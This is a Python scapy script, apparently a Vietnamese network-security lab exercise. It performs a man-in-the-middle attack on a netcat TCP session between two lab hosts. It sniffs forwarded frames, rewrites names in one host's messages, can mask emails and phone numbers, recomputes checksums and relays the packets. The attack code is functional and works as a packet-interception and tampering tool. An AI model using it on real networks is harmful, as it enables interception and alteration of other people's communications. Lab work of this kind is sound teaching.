#!/usr/bin/env python3
import argparse

from scapy.all import Ether, IP, TCP, Raw, sniff, sendp, get_if_hwaddr
from mask_sensitive import build_name_pattern, thay_ten, che_thong_tin

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"
IFACE = "eth0"
PORT = 9090
MAC_M = get_if_hwaddr(IFACE)


def doc_danh_sach_ten(args):
    names = list(args.names)
    if args.file:
        with open(args.file, encoding="utf-8") as f:
            names += [line.strip() for line in f if line.strip()]
    names = list(dict.fromkeys(names))  
    return names


def xu_ly_payload(du_lieu_cu, pattern, mask_sensitive):
    du_lieu_moi = thay_ten(du_lieu_cu, pattern)   
    if mask_sensitive:                            
        du_lieu_moi = che_thong_tin(du_lieu_moi)
    return du_lieu_moi


def make_handler(pattern, mask_sensitive):
    def xu_ly_goi_tin(pkt):
        if not (pkt.haslayer(Ether) and pkt.haslayer(IP) and pkt.haslayer(TCP)):
            return

        ip = pkt[IP]
        if ip.src == IP_A and ip.dst == IP_B:
            mac_dich = MAC_B
        elif ip.src == IP_B and ip.dst == IP_A:
            mac_dich = MAC_A
        else:
            return

        if pkt.haslayer(Raw) and ip.src == IP_A:
            du_lieu_cu = bytes(pkt[Raw].load)
            du_lieu_moi = xu_ly_payload(du_lieu_cu, pattern, mask_sensitive)

           
            if len(du_lieu_moi) != len(du_lieu_cu):
                print("[MITM] Loi: Do dai payload thay doi! Bo qua goi nay.")
                return

            if du_lieu_moi != du_lieu_cu:
                pkt[Raw].load = du_lieu_moi
                print("[MITM] Du lieu goc:",
                      du_lieu_cu.decode("utf-8", errors="replace").strip())
                print("[MITM] Du lieu da sua:",
                      du_lieu_moi.decode("utf-8", errors="replace").strip())

        pkt[Ether].src = MAC_M
        pkt[Ether].dst = mac_dich
        if pkt[IP].len is not None:
            del pkt[IP].len
        del pkt[IP].chksum
        del pkt[TCP].chksum

        sendp(pkt, iface=IFACE, verbose=False)
    return xu_ly_goi_tin


def main():
    parser = argparse.ArgumentParser(description="MITM Netcat - thay tên bằng A")
    parser.add_argument("names", nargs="*",
                        help="Tên truyền trực tiếp (tùy chọn)")
    parser.add_argument("--file",
                        help="File chứa danh sách tên, mỗi dòng một tên")
    parser.add_argument("--mask-sensitive", action="store_true",
                        help="Bật phần mở rộng: che email và số điện thoại bằng X")
    args = parser.parse_args()

    names = doc_danh_sach_ten(args)
    if not names:
        parser.error("Cần ít nhất một tên (truyền trực tiếp hoặc qua --file)")

    pattern = build_name_pattern(names)

    bo_loc = (
        f"ether dst {MAC_M} and tcp port {PORT} "
        f"and ((src host {IP_A} and dst host {IP_B}) "
        f"or (src host {IP_B} and dst host {IP_A}))"
    )

    print(f"So ten can thay: {len(names)} | Che email/SDT: {args.mask_sensitive}")
    print(f"Ten: {names}")
    print(f"Host M dang lang nghe va chuyen tiep TCP cong {PORT}...")
    sniff(iface=IFACE, filter=bo_loc,
          prn=make_handler(pattern, args.mask_sensitive), store=False)


if __name__ == "__main__":
    main()
